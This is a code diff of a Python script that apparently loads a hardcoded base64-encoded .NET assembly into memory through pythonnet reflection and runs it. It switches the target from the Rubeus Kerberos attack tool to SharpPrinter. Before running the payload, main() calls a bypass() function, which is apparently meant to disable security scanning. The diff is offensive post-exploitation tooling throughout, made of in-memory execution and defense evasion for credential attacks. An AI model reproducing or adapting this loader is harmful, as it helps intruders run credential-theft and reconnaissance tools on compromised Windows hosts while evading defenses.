@@ -7,6 +7,7 @@ from ctypes import *
 import System
 from System import Array, IntPtr, UInt32
 from System.Reflection import Assembly
+import System.Reflection as Reflection
 
 # Ensure necessary .NET references are added
 clr.AddReference("System.Management.Automation")
@@ -79,13 +80,14 @@ def load_and_execute_assembly(command):
     assembly = Assembly.Load(assembly_bytes)
     
     # Get the type of the Rubeus.Program class
-    rubeus_program_type = assembly.GetType("Rubeus.Program")
-
+    program_type = assembly.GetType("SharpPrinter.Program")
     # You don't need to create an instance of the class for a static method
-    method = rubeus_program_type.GetMethod("MainString")
-
+    method = program_type.GetMethod("MainString")
+    if method == None:
+        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
+        print(method)
     # Convert your command to a .NET string array
-    command_args = to_clr_array([command])
+    command_args = Array[str](command)
 
     # Invoke the MainString method
     result = method.Invoke(None, command_args)
@@ -95,7 +97,8 @@ def load_and_execute_assembly(command):
 def main():
     bypass()
     parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
-    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')
+    parser.add_argument('command', type=str, nargs='?', default="", 
+                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')
 
     args = parser.parse_args()
     
